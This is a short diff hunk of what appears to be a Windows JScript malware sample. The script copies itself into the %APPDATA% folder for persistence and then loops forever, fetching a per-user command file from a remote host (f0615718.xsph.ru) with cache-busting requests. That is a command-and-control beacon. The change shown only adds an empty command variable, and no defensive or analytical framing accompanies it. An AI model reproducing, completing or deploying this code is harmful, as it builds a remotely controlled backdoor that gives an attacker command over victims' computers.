@@ -5,7 +5,7 @@ fs.CopyFile(WScript.ScriptFullName, shell.ExpandEnvironmentStrings("%APPDATA%\\M
 
 while(true){
 	var xmlhttp = WScript.CreateObject("Microsoft.XMLHTTP");
-
+        var cmd = "";
 
 	xmlhttp.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/USER_ID.txt?rand=" + new Date().getTime(), false);
 	xmlhttp.setRequestHeader('Cache-Control', 'no-cache, no-store, max-age=0');
